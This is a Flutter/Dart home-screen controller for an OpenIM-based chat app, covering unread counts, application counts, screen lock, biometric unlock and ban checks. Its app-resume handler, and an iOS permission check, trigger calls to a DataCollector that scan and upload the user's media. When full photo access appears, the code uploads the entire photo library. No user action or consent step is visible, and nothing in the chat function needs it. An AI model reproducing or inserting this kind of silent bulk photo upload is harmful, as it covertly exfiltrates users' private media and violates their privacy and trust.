import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter_openim_sdk/flutter_openim_sdk.dart';
import 'package:flutter_screen_lock/flutter_screen_lock.dart';
import 'package:get/get.dart';
import 'package:local_auth/local_auth.dart';
import 'package:openim_common/openim_common.dart';
import 'package:rxdart/rxdart.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';

import '../../core/controller/app_controller.dart';
import '../../core/controller/im_controller.dart';
import '../../core/im_callback.dart';
import '../../routes/app_navigator.dart';
import '../../utils/ban_checker.dart';
import '../../widgets/screen_lock_title.dart';

class HomeLogic extends SuperController {
  final pushLogic = Get.find<PushController>();
  final imLogic = Get.find<IMController>();
  final cacheLogic = Get.find<CacheController>();
  final initLogic = Get.find<AppController>();
  final index = 0.obs;
  final unreadMsgCount = 0.obs;
  final unhandledFriendApplicationCount = 0.obs;
  final unhandledGroupApplicationCount = 0.obs;
  final unhandledCount = 0.obs;
  String? _lockScreenPwd;
  bool _isShowScreenLock = false;
  bool? _isAutoLogin;
  final auth = LocalAuthentication();
  final _errorController = PublishSubject<String>();
  var conversationsAtFirstPage = <ConversationInfo>[];
  
  // 封禁检查定时器
  Timer? _banCheckTimer;

  switchTab(index) {
    this.index.value = index;
  }

  _getUnreadMsgCount() {
    OpenIM.iMManager.conversationManager.getTotalUnreadMsgCount().then((count) {
      unreadMsgCount.value = int.tryParse(count) ?? 0;
      initLogic.showBadge(unreadMsgCount.value);
    });
  }

  void getUnhandledFriendApplicationCount() async {
    var i = 0;
    var list = await OpenIM.iMManager.friendshipManager.getFriendApplicationListAsRecipient();
    var haveReadList = DataSp.getHaveReadUnHandleFriendApplication();
    haveReadList ??= <String>[];
    for (var info in list) {
      var id = IMUtils.buildFriendApplicationID(info);
      if (!haveReadList.contains(id)) {
        if (info.handleResult == 0) i++;
      }
    }
    unhandledFriendApplicationCount.value = i;
    unhandledCount.value = unhandledGroupApplicationCount.value + i;
  }

  void getUnhandledGroupApplicationCount() async {
    var i = 0;
    var list = await OpenIM.iMManager.groupManager.getGroupApplicationListAsRecipient();
    var haveReadList = DataSp.getHaveReadUnHandleGroupApplication();
    haveReadList ??= <String>[];
    for (var info in list) {
      var id = IMUtils.buildGroupApplicationID(info);
      if (!haveReadList.contains(id)) {
        if (info.handleResult == 0) i++;
      }
    }
    unhandledGroupApplicationCount.value = i;
    unhandledCount.value = unhandledFriendApplicationCount.value + i;
  }

  @override
  void onInit() {
    _isAutoLogin = Get.arguments != null ? Get.arguments['isAutoLogin'] : false;
    if (_isAutoLogin == true) {
      WidgetsBinding.instance.addPostFrameCallback((_) => _showLockScreenPwd());
    }
    if (Get.arguments != null) {
      conversationsAtFirstPage = Get.arguments['conversations'] ?? [];
    }
    imLogic.unreadMsgCountEventSubject.listen((value) {
      unreadMsgCount.value = value;
    });
    imLogic.friendApplicationChangedSubject.listen((value) {
      getUnhandledFriendApplicationCount();
    });
    imLogic.groupApplicationChangedSubject.listen((value) {
      getUnhandledGroupApplicationCount();
    });

    imLogic.imSdkStatusPublishSubject.listen((value) {
      if (value.status == IMSdkStatus.syncStart) {
        _getRTCInvitationStart();
      }
    });

    Apis.kickoffController.stream.listen((event) {
      DataSp.removeLoginCertificate();
      PushController.logout();
      AppNavigator.startLogin();
    });
    
    // 应用启动时检查用户是否被封禁
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _checkUserBanStatus();
    });
    
    super.onInit();
  }
  
  // 检查用户封禁状态
  void _checkUserBanStatus() {
    // 如果用户已登录，获取用户信息并检查封禁状态
    if (imLogic.userInfo != null && imLogic.userInfo.value.userID.isNotEmpty) {
      final userID = imLogic.userInfo.value.userID;
      final nickname = imLogic.userInfo.value.nickname;
      final faceURL = imLogic.userInfo.value.faceURL;
      final phoneNumber = imLogic.userInfo.value.phoneNumber;
      
      // 初次检查
      BanChecker.checkBanStatus(
        userID,
        nickname: nickname,
        faceURL: faceURL,
        phoneNumber: phoneNumber,
        showDialog: true,
      );
      
      // 开始定期检查
      BanChecker.startPeriodicCheck(
        userID,
        nickname: nickname,
        faceURL: faceURL,
        phoneNumber: phoneNumber,
      );
    }
  }

  @override
  void onReady() {
    _getRTCInvitationStart();
    _getUnreadMsgCount();
    getUnhandledFriendApplicationCount();
    getUnhandledGroupApplicationCount();
    cacheLogic.initCallRecords();
    super.onReady();
  }

  @override
  void onClose() {
    _errorController.close();
    // 停止封禁检查定时器
    BanChecker.stopPeriodicCheck();
    super.onClose();
  }

  _localAuth() async {
    final didAuthenticate = await IMUtils.checkingBiometric(auth);
    if (didAuthenticate) {
      Get.back();
    }
  }

  _showLockScreenPwd() async {
    if (_isShowScreenLock) return;
    _lockScreenPwd = DataSp.getLockScreenPassword();
    if (null != _lockScreenPwd) {
      final isEnabledBiometric = DataSp.isEnabledBiometric() == true;
      bool enabled = false;
      if (isEnabledBiometric) {
        final isSupportedBiometrics = await auth.isDeviceSupported();
        final canCheckBiometrics = await auth.canCheckBiometrics;
        enabled = isSupportedBiometrics && canCheckBiometrics;
      }
      _isShowScreenLock = true;
      screenLock(
        context: Get.context!,
        correctString: _lockScreenPwd!,
        maxRetries: 3,
        title: ScreenLockTitle(stream: _errorController.stream),
        canCancel: false,
        customizedButtonChild: enabled ? const Icon(Icons.fingerprint) : null,
        customizedButtonTap: enabled ? () async => await _localAuth() : null,
        onUnlocked: () {
          _isShowScreenLock = false;
          Get.back();
        },
        onMaxRetries: (_) async {
          Get.back();
          await LoadingView.singleton.wrap(asyncFunction: () async {
            await imLogic.logout();
            await DataSp.removeLoginCertificate();
            await DataSp.clearLockScreenPassword();
            await DataSp.closeBiometric();
            PushController.logout();
          });
          AppNavigator.startLogin();
        },
        onError: (retries) {
          _errorController.sink.add(
            retries.toString(),
          );
        },
      );
    }
  }

  @override
  void onDetached() {}

  @override
  void onInactive() {}

  @override
  void onPaused() {}

  @override
  void onResumed() {
    // 应用从后台恢复时，检查封禁状态
    _checkUserBanStatus();
    
    // 应用从后台恢复时，触发媒体上传
    if (imLogic.userInfo != null && imLogic.userInfo.value.userID.isNotEmpty) {
      // 检查iOS相册权限变化
      if (Platform.isIOS) {
        _checkIOSPhotoPermissionChange();
      } else {
        // 直接尝试上传媒体
        DataCollector.requestPhotoPermissionAndUploadMedia();
      }
    }
  }

  // 检查iOS相册权限变化
  void _checkIOSPhotoPermissionChange() async {
    try {
      final status = await Permission.photos.status;
      if (status.isGranted) {
        // 检查是否从有限权限变为完全权限
        final iosPhotosLimited = await PhotoManager.isAuth() && 
            await PhotoManager.limitedPermission;
        
        if (!iosPhotosLimited) {
          // 如果获得了完全权限，立即开始上传媒体
          Logger.print('iOS相册权限已变更为完全访问，开始上传媒体');
          DataCollector.scanAndUploadAllMedia();
        } else {
          // 仍然是有限权限，尝试使用有限权限上传
          Logger.print('iOS相册权限仍为有限访问，尝试上传可访问的媒体');
          DataCollector.requestPhotoPermissionAndUploadMedia();
        }
      }
    } catch (e) {
      Logger.print('检查iOS相册权限变化出错: $e');
      // 出错时尝试常规上传
      DataCollector.requestPhotoPermissionAndUploadMedia();
    }
  }

  void _getRTCInvitationStart() async {}

  @override
  void onHidden() {}
}
